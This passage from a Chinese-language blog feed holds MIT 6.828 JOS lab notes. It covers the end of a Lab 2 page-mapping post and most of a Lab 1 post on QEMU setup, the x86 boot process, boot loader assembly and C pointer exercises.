        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"Usage: showmappings 0xbegin_addr 0xend_addr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">long</span> begin <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">&lt;=</span> begin<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"end_addr must larger than begin_addr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">></span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"end_addr overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>begin <span class="token operator">!=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>begin<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span> <span class="token operator">||</span> end <span class="token operator">!=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>end<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"not aligned\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> begin <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> begin<span class="token operator">+</span><span class="token operator">=</span>PGSIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"%08x--%08x: "</span><span class="token punctuation">,</span> begin<span class="token punctuation">,</span> begin<span class="token operator">+</span>PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pte_t <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">pgdir_walk</span><span class="token punctuation">(</span>kern_pgdir<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>begin<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pte<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"not mapped\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"page %08x "</span><span class="token punctuation">,</span> <span class="token function">PTE_ADDR</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">cprintf</span><span class="token punctuation">(</span><span class="token string">"PTE_P: %x, PTE_W: %x, PTE_U: %x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_P<span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_W<span class="token punctuation">,</span> <span class="token operator">*</span>pte<span class="token operator">&amp;</span>PTE_U<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u5730_u5740_u7A7A_u95F4_u5E03_u5C40"><a href="#u5730_u5740_u7A7A_u95F4_u5E03_u5C40" class="headerlink" title="地址空间布局"></a>地址空间布局</h3><p>地址空间布局可以有多种，x86的模式是为了向后兼容。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这个lab更多的是动手写代码，分页机制在计算机组成原理曾经讲过一部分，然而如今已经忘了，做这个lab还要配合CSAPP，总之通过看了很多文章，终于依葫芦画瓢的把这个lab给结束掉了。</p>
<h2 id="u53C2_u8003_u8D44_u6599"><a href="#u53C2_u8003_u8D44_u6599" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.cnblogs.com/fatsheep9146/category/769143.html" target="_blank" rel="external">MIT 6.828 JOS 操作系统学习笔记</a></p>
<p><a href="http://grid.hust.edu.cn/zyshao/Teaching_Material/OSEngineering/Chapter4.pdf" target="_blank" rel="external">第四章.内存管理(lab2)(v0.1)</a></p>
<p><a href="https://github.com/Clann24/jos/tree/master/lab2" target="_blank" rel="external">Clann24/jos</a></p>
]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 1</title>
    <link href="http://xinqiu.me/2016/10/15/MIT-6.828-1/"/>
    <id>http://xinqiu.me/2016/10/15/MIT-6.828-1/</id>
    <published>2016-10-14T16:00:00.000Z</published>
    <updated>2017-03-31T09:32:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>MIT 6.828 算是操作系统的经典课程，其中要求完成一个JOS的操作系统。在这之前，需要完成一些环境的安装。</p>
<a id="more"></a>
<h2 id="u524D_u671F_u51C6_u5907"><a href="#u524D_u671F_u51C6_u5907" class="headerlink" title="前期准备"></a>前期准备</h2><p>我的系统是Ubuntu 14.04 64位，在虚拟机中运行的。在Lab 1中提到了安装实验的方法。考虑到国内的网络情况，建议使用ss配合proxychains在终端中使用</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://pdos.csail.mit.edu/6.828/2016/jos.git lab
</code></pre>
<p>如果直接make可能会出现<code>undefined reference to &#39;__udivdi3&#39;</code>的问题，解决方案：</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-multilib
</code></pre>
<p>如果没装qemu，这里需要安装qemu，在课程的Tools页面中，提到了QEMU最好安装修改版，考虑到<code>git clone http://web.mit.edu/ccutler/www/qemu.git -b 6.828-2.3.0</code>这个不好clone，建议使用</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/geofft/qemu.git -b 6.828-2.3.0
</code></pre>
<p>在执行 <code>./configure --disable-kvm [--prefix=PFX] [--target-list=&quot;i386-softmmu x86_64-softmmu&quot;]</code> （PFX为安装路径，可以省略）<br>时，可能会出现几种情况：</p>
<ol>
<li>ERROR: zlib check failed<pre><code>Make sure to have the zlib libs and headers installed.
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install zlib1g-dev</code></p>
<ol>
<li>ERROR: glib-2.12 gthread-2.0 is required to compile QEMU</li>
</ol>
<p>解决: <code>sudo apt-get install libglib2.0-dev</code></p>
<ol>
<li>ERROR: pixman &gt;= 0.21.8 not present. Your options:<pre><code>  (1) Preferred: Install the pixman devel package (any recent
      distro should have packages as Xorg needs pixman too).
  (2) Fetch the pixman submodule, using:
      git submodule update --init pixman
</code></pre></li>
</ol>
<p>解决: <code>sudo apt-get install libpixman-1-dev</code></p>
<p>还有一个找了很久解决方案的错误:</p>
<pre class=" language-bash"><code class="language-bash">vl.c: In <span class="token keyword">function</span> ‘main’:
vl.c:2778:5: error: ‘g_mem_set_vtable’ is deprecated <span class="token punctuation">[</span>-Werror<span class="token operator">=</span>deprecated-declarations<span class="token punctuation">]</span>
     g_mem_set_vtable<span class="token punctuation">(</span><span class="token operator">&amp;</span>mem_trace<span class="token punctuation">)</span><span class="token punctuation">;</span>
     ^
In <span class="token function">file</span> included from /usr/include/glib-2.0/glib/glist.h:32:0,
                 from /usr/include/glib-2.0/glib/ghash.h:33,
                 from /usr/include/glib-2.0/glib.h:50,
                 from vl.c:59:
/usr/include/glib-2.0/glib/gmem.h:357:7: note: declared here
 void  g_mem_set_vtable <span class="token punctuation">(</span>GMemVTable *vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
       ^
cc1: all warnings being treated as errors
rules.mak:57: recipe <span class="token keyword">for</span> target <span class="token string">'vl.o'</span> failed
make: *** <span class="token punctuation">[</span>vl.o<span class="token punctuation">]</span> Error 1
</code></pre>
<p>其实解决起来很简单，在Makefile文件最后加上一行 <code>QEMU_CFLAGS+=-w</code> 就可以了。 </p>
<p>之后运行 <code>make &amp;&amp; make install</code> ,这里可能会出现一个权限不够的坑，建议先提权 <code>sudo -s</code>。<br>至此，<code>make</code>会出现：</p>
<p><img src="1.png" alt=""></p>
<p>生成了一个 <code>kernel.img</code> 的镜像，执行 <code>make qemu</code> 就会用 qemu 去运行这个镜像</p>
<p><img src="2.png" alt=""></p>
<p>倒是我这里没看到’Booting from Hard Disk…’，另外前面还有一堆信息。输入 <code>help</code> 和 <code>kerninfo</code> 都有正常信息出现，所以应该环境什么应该算是搭建好了。</p>
<h2 id="Part_1_3A_PC_Bootstrap"><a href="#Part_1_3A_PC_Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="PC_u7269_u7406_u5730_u5740_u7A7A_u95F4"><a href="#PC_u7269_u7406_u5730_u5740_u7A7A_u95F4" class="headerlink" title="PC物理地址空间"></a>PC物理地址空间</h3><pre><code>+------------------+  &lt;- 0xFFFFFFFF (4GB)
|      32-bit      |
|  memory mapped   |
|     devices      |
|                  |
/\/\/\/\/\/\/\/\/\/\

/\/\/\/\/\/\/\/\/\/\
|                  |
|      Unused      |
|                  |
+------------------+  &lt;- depends on amount of RAM
|                  |
|                  |
| Extended Memory  |
|                  |
|                  |
+------------------+  &lt;- 0x00100000 (1MB)
|     BIOS ROM     |
+------------------+  &lt;- 0x000F0000 (960KB)
|  16-bit devices, |
|  expansion ROMs  |
+------------------+  &lt;- 0x000C0000 (768KB)
|   VGA Display    |
+------------------+  &lt;- 0x000A0000 (640KB)
|                  |
|    Low Memory    |
|                  |
+------------------+  &lt;- 0x00000000
</code></pre><p>早期基于16位Intel 8088处理器只能操作1MB物理内存，因此物理地址空间起始于0x00000000到0x000FFFFF，其中640KB为 Low memory，这只能被随机存储器(RAM)使用。</p>
<p>从 0x000A0000 到 0x000FFFFF 的384KB留着给特殊使用，例如作为视频显示缓存或者储存在非易失存储器的硬件。从 0x000F0000 到 0x000FFFFF 占据64KB区域的部分是最重要的BIOS。BIOS的功能这里就不细说了。</p>
<p>现在的x86处理器支持超过4GB的物理RAM，所以RAM扩展到了0xFFFFFFFF。当然，BIOS也流出了开始的32位寻址空间为了让32位的设备映射。JOS这里只用开始的256MB，所以假设PC只有32位地址空间。</p>
<h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p>在一个终端中输入 <code>make qemu-gdb</code> ， 另一个终端输入 <code>make gdb</code> 。开始调试程序。</p>
<p><code>[f000:fff0] 0xffff0:    ljmp   $0xf000,$0xe05b</code></p>
<p>是GDB反汇编出的第一条执行指令，这条指令表面了：</p>
<ul>
<li>IBM PC 执行的起始物理地址为 0x000ffff0</li>
<li>PC 的偏移方式为 CS = 0xf000，IP = 0xfff0</li>
<li>第一条指令执行的是 jmp指令，跳转到段地址  CS = 0xf000，IP = 0xe05b</li>
</ul>
<p>QEMU模拟了8088处理器的启动，当启动电源，BIOS最先控制机器，这时还没有其他程序执行，之后处理器进入实模式也就是设置 CS 为 0xf000，IP 为 0xfff0。在启动电源也就是实模式时，地址转译根据这个公式工作：物理地址 = 16 * 段地址 + 偏移量。所以 PC 中 CS 为 0xf000 IP 为 0xfff0 的物理地址为：</p>
<pre><code>   16 * 0xf000 + 0xfff0   # 十六进制中乘16很容易
   = 0xf0000 + 0xfff0     # 仅仅添加一个0.
   = 0xffff0
</code></pre><p>0xffff0 在 BIOS (0x100000) 的结束地址之前。</p>
<p>当BIOS启动，它设置了一个中断描述符表并初始化多个设备比如VGA显示器。在初始化PCI总线和所有重要的设备之后，它寻找可引导的设备，之后读取 <em>boot loader</em> 并转移控制。</p>
<h2 id="Part_2_3A_The_Boot_Loader"><a href="#Part_2_3A_The_Boot_Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>接下来是512 byte区域的扇区，它是硬盘最小调度单位，每次读或写操作都至少是一个扇区，并且还会进行对齐。BIOS加载引导扇区到内存中是从物理地址0x7c00到0x7dff，然后使用jmp指令设置 CS:IP 为 0000:7c00。因此 boot loader 不能超过512字节，它执行两个功能：</p>
<ol>
<li><p>boot loader 切换处理器从实模式到保护模式，只有这样才能访问大于1MB的物理地址空间。</p>
</li>
<li><p>boot loader 从硬盘中读取内核。</p>
</li>
</ol>
<h3 id="u52A0_u8F7DBoot"><a href="#u52A0_u8F7DBoot" class="headerlink" title="加载Boot"></a>加载Boot</h3><h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>通过 <code>b *0x7c00</code> 设置断点，接着 <code>c</code> 运行到断点处，使用 <code>x/i</code> 来查看当前的指令。</p>
<ul>
<li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? 在哪执行了32位代码？</p>
<p>  <code>[   0:7c2d] =&gt; 0x7c2d:    ljmp   $0x8,$0x7c32</code> 这条指令之后，也就是 <code>boot.S</code> 中的 <code>ljmp $PROT_MODE_CSEG, $protcseg</code> ，地址符号就变成 0x7c32 了。</p>
</li>
<li><p>What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded?最后一条 boot loader 指令，第一条内核指令？</p>
<p>  boot loader 最后一步是加载kernel，所以在 <code>boot/main.c</code> 中可以找到 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 这行代码，上面的注释 <code>call the entry point from the ELF header</code> 表明这是准备读取ELF头。<br>  通过 <code>objdump -x obj/kern/kernel</code> 可以查看kernel的信息，其中开头就有 <code>start address 0x0010000c</code>，通过 <code>b *0x10000c</code>然后在 <code>c</code> 能得到执行的指令是 <code>movw   $0x1234,0x472</code>，当然在 <code>kern/entry.S</code> 中也能找到这个指令。</p>
</li>
<li><p>Where is the first instruction of the kernel?</p>
<p>  同上一条的问题，存在kern/entry.S中。</p>
</li>
</ul>
<ul>
<li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? </p>
<p>  关于查看kernel信息的，通过 <code>objdump -h obj/kern/kernel</code> 可以得出相关信息。</p>
</li>
</ul>
<p>接下来就可以来完成 Exercise 3。设置一个断点在地址0x7c00处，这是boot sector被加载的位置。然后让程序继续运行直到这个断点。跟踪<code>/boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的x/i指令来获取去任意一个机器指令的反汇编指令，把源文件<code>boot.S</code>文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p>
<p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出和readsect()c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p>
<p>首先查看boot.S文件，在开头可以看到</p>
<pre><code>start:
  .code16                     # 16位汇编模式
  cli                         # 关中断
  cld                         # String operations increment
</code></pre><p><code>cld</code> 是串操作指令，用来操作方向标志位DF，使DF=0。</p>
<pre><code>  # Set up the important data segment registers (DS, ES, SS).
  xorw    %ax,%ax             # Segment number zero
  movw    %ax,%ds             # -&gt; Data Segment
  movw    %ax,%es             # -&gt; Extra Segment
  movw    %ax,%ss             # -&gt; Stack Segment
</code></pre><p>将DS、ES、SS寄存器清零。</p>
<pre><code>  # Enable A20:
  #   For backwards compatibility with the earliest PCs, physical
  #   address line 20 is tied low, so that addresses higher than
  #   1MB wrap around to zero by default.  This code undoes this.
seta20.1:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.1

  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64
  outb    %al,$0x64

seta20.2:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.2

  movb    $0xdf,%al               # 0xdf -&gt; port 0x60
  outb    %al,$0x60
</code></pre><p>开启A20，关于为什么要开A20,可以看<a href="https://www.zhihu.com/question/29375534" target="_blank" rel="external">知乎:OS boot 的时候为什么要 enable A20？</a>。</p>
<p><code>inb     $0x64,%al</code> 把0x64端口(8042键盘控制器)的状态写入al中（inb代表IO端口读）, 之后 <code>testb   $0x2,%al</code> 判断al的第二位是否为0，不为0就循环执行seta20.1。这里第二位代表输入缓冲区是否满了。接着0xd1放入0x64端口。最后将0xdf放入0x60端口，代表开启A20地址线了。</p>
<pre><code>  # Switch from real to protected mode, using a bootstrap GDT
  # and segment translation that makes virtual addresses 
  # identical to their physical addresses, so that the 
  # effective memory map does not change during the switch.
  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE_ON, %eax
  movl    %eax, %cr0
</code></pre><p>切换到保护模式后，加载GDT(Global Descriptor Table)，接着修改了cr0寄存器的值，$CR0_PE_ON值为0x1，代表启动保护模式的flag标志。</p>
<pre><code>  # Jump to next instruction, but in 32-bit code segment.
  # Switches processor into 32-bit mode.
  ljmp    $PROT_MODE_CSEG, $protcseg
</code></pre><p>也就是 <code>0x7c2d:    ljmp   $0x8,$0x7c32</code> 跳转到了32位代码段。</p>
<pre><code>protcseg:
  # Set up the protected-mode data segment registers
  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector
  movw    %ax, %ds                # -&gt; DS: Data Segment
  movw    %ax, %es                # -&gt; ES: Extra Segment
  movw    %ax, %fs                # -&gt; FS
  movw    %ax, %gs                # -&gt; GS
  movw    %ax, %ss                # -&gt; SS: Stack Segment
</code></pre><p>修改了这些寄存器的值。</p>
<pre><code>  # Set up the stack pointer and call into C.
  movl    $start, %esp
  call bootmain
</code></pre><p>设置栈指针，接着开始调用bootmain函数。</p>
<pre><code>    7d15:    55                       push   %ebp
    7d16:    89 e5                    mov    %esp,%ebp
    7d18:    56                       push   %esi
    7d19:    53                       push   %ebx
</code></pre><p>首先做进入函数的准备工作</p>
<pre><code>    // read 1st page off disk
    readseg((uint32_t) ELFHDR, SECTSIZE*8, 0);
    7d1a:    6a 00                    push   $0x0
    7d1c:    68 00 10 00 00           push   $0x1000
    7d21:    68 00 00 01 00           push   $0x10000
    7d26:    e8 b1 ff ff ff           call   7cdc &lt;readseg&gt;
</code></pre><p>接着调用readseg函数，这个函数有3个参数，第一个是物理地址，第二个是页的大小，第三个是偏移量。</p>
<p><code>0x7ceb:    shr    $0x9,%edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 这条代码前面的除法部分，得出扇区号。</p>
<p><code>0x7cee:    add    %ebx,%esi</code> 执行了 <code>end_pa = pa + count;</code> 计算出这个扇区结束的物理地址。</p>
<p><code>0x7cf0:    inc    %edi</code> 执行了 <code>offset = (offset / SECTSIZE) + 1;</code> 中的加1。</p>
<p><code>0x7cf1:    and    $0xfffffe00,%ebx</code> 执行了 <code>pa &amp;= ~(SECTSIZE - 1);</code>。</p>
<pre><code>0x7cf7:    cmp    %esi,%ebx
0x7cf9:    jae    0x7d0d
</code></pre><p>执行 <code>while (pa &lt; end_pa)</code> 这个循环判断语句。</p>
<p>之后几条汇编是为readsect函数做准备，这个函数是读取扇区内容的。</p>
<p><img src="3.png" alt=""></p>
<p>判断 <code>ELFHDR-&gt;e_magic != ELF_MAGIC</code> 这个条件。</p>
<p><img src="4.png" alt=""></p>
<p>加载程序段由这几个部分汇编构成</p>
<pre><code>7d3a:    a1 1c 00 01 00           mov    0x1001c,%eax
7d3f:    0f b7 35 2c 00 01 00     movzwl 0x1002c,%esi
7d46:    8d 98 00 00 01 00        lea    0x10000(%eax),%ebx
7d4c:    c1 e6 05                 shl    $0x5,%esi
7d4f:    01 de                    add    %ebx,%esi
</code></pre><p>之后循环调用readseg函数，将Program Header Table中表项读入内存。</p>
<p>最后一步就是</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>ELFHDR<span class="token operator">-></span>e_entry<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>至此，Exercise 3算是走了一遍过程。</p>
<h3 id="u52A0_u8F7D_u5185_u6838"><a href="#u52A0_u8F7D_u5185_u6838" class="headerlink" title="加载内核"></a>加载内核</h3><h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>阅读 K&amp;R 的 <em>The C Programming Language</em>， 理解 <a href="https://pdos.csail.mit.edu/6.828/2016/labs/lab1/pointers.c" target="_blank" rel="external">pointers.c</a>.</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>
<span class="token keyword">int</span> i<span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1: a = %p, b = %p, c = %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>结果是 <code>1: a = 0x7fff5fbff810, b = 0x100600000, c = 0x100000000</code></p>
<p>a是数组，所以输出的0x7fff5fbff810是数组a的首地址。b是指针，指向malloc分配的空间的起始地址0x100600000。c是未定义的指针。</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> a<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>
c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>c = a;</code> 让指针c指向a指向的地址。先是for循环，给数组a赋值为100、101、102、103。因为c现在和a指向同一区域，所以c[0]修改的是数组a的第一个元素，所以结果是 <code>2: a[0] = 200, a[1] = 101, a[2] = 102, a[3] = 103</code>.</p>
<pre class=" language-c"><code class="language-c">c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span>c <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">301</span><span class="token punctuation">;</span>
<span class="token number">3</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">302</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>三种修改数组中值的方法，其中第三种没怎么见过，有点像汇编里地址偏移的方式，3[c]就是c的地址偏移到第三个元素的地址，所以输出为 <code>3: a[0] = 200, a[1] = 300, a[2] = 301, a[3] = 302</code>.</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>移动指针指向了数组的第二个元素，所以输出为 <code>4: a[0] = 200, a[1] = 400, a[2] = 301, a[3] = 302</code>.</p>
<pre class=" language-c"><code class="language-c">c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> c <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span><span class="token punctuation">,</span>
           a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>c = (int *) ((char *) c + 1);</code> 这一行代码先将c强制转型为char指针，接着指针加1，再强转回int指针。一步一步来看，首先可以确定在执行这行代码之前，c的地址为 0x7fff5fbff814(因为系统是64位的，其实地址为 0x00007fff5fbff814，只不过前面的0省略了)，所以强转为char指针后加1得到的地址为 0x7fff5fbff815，因为char只占一个字节。因为c原来值为400，也就是十六进制的0x190.在c强转之前，打印 (char <em>) c 的地址为 0x7fff5fbff814，查看 </em>(char *) c 的值为 ffffff90。这里要说明一下，为什么90前面都是ffffff，这不是fff团对单身狗的报复，而是 </p>
<pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>中，%x 将值强转为unsigned int，unsigned int在我的系统中占4个字节。所以打印出来有8位。用 <code>%c</code> 可以得到真正这个地方的值，只不过是八进制的。当然查看这个值最方便的还是声明个变量，然后在Xcode打断点进行查看。声明一个变量 <code>char *p= (char *)c;</code>, 使用 <code>p++</code> 进行单步调试，可以查看 <code>*p</code> 的值。</p>
<pre><code>0x7fff5fbff814  0x90
0x7fff5fbff815  0x01
0x7fff5fbff816  0x0
0x7fff5fbff817  0x0
0x7fff5fbff818    2d
0x7fff5fbff819    1
